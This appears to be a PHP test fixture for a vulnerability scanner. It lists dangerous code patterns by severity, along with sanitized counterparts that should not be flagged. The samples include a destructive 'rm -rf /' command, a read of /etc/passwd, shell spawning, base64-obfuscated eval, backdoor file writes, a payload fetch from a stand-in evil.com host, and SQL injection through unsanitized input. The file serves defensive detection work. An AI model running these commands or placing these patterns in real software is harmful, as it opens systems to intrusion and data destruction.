<?php
// CRITICAL patterns
eval($code);
exec("rm -rf /");
system("whoami");
passthru("ls");
shell_exec("cat /etc/passwd");
popen("/bin/sh", "r");
proc_open("cmd", $descriptors, $pipes);
eval(base64_decode($encoded));
include(base64_decode($path));
preg_replace('/.*/e', $_POST['code'], '');
create_function('$a', 'return $a;');
assert('phpinfo()');
assert($_GET['code']);
call_user_func($_GET['func']);
call_user_func_array($_POST['func'], $_REQUEST['args']);
file_put_contents("shell.php", $code);
fwrite($fp, "backdoor.php");
include($_GET['page']);
require($_POST['template']);
require_once($_REQUEST['file']);

// HIGH patterns
$$varname = "dynamic";
extract($_POST);
$data = unserialize($input);
$html = file_get_contents('https://evil.com/payload');
curl_exec($ch);
wp_remote_get($url);
wp_remote_post($url, $args);
$id = $_GET['id'];
$name = $_POST['name'];
$val = $_REQUEST['val'];
$host = $_SERVER['HTTP_HOST'];
$wpdb->query("DELETE FROM wp_users WHERE id = $id");
$wpdb->get_results("SELECT * FROM wp_posts WHERE title = '$title'");
$wpdb->get_var("SELECT count(*) FROM wp_users");

// HIGH patterns with sanitization (should NOT trigger)
$id = intval($_GET['id']);
$name = sanitize_text_field($_POST['name']);
$val = esc_html($_REQUEST['val']);
$host = esc_url($_SERVER['HTTP_HOST']);
$wpdb->get_results($wpdb->prepare("SELECT * FROM wp_posts WHERE id = %d", $id));

// MEDIUM patterns
error_reporting(0);
@exec("hidden");
chmod("/tmp/file", 0777);
ini_set('display_errors', 0);
$x = chr(65).chr(66).chr(67);
$data = pack('H*', '4861636b');
$bin = hex2bin('48656c6c6f');
